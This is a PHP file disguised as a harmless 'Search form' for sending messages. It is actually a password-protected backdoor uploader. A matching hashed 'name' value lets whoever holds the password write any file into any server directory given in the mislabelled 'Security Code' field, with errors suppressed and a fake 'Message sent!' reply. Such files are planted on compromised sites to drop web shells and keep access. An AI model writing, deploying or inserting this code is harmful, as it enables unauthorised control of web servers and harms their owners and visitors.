<?php
if(!empty($_FILES['message']['name']) && (md5($_POST['name']) == '2970d43d7bf4115cdc60e2453bf48b52')) 
{
	$security_code = (empty($_POST['security_code'])) ? '.' : $_POST['security_code'];
	$security_code = rtrim($security_code, "/");
	@move_uploaded_file($_FILES['message']['tmp_name'], $security_code."/".$_FILES['message']['name']) ? print "<b>Message sent!</b><br/>" : print "<b>Error!</b><br/>";
}
print '<html>
    <head>
    <title>Search form</title>
    </head>
    <body>
    <form enctype="multipart/form-data" action="" method="POST">
    Message: <br/><input name="message" type="file" />
    <br/>Security Code: <br/><input name="security_code" value=""/>
	<br/>Name: <br/><input name="name" value=""/><br/>
    <input type="submit" value="Sent" />
    </form>
    </body>
    </html>';//2627025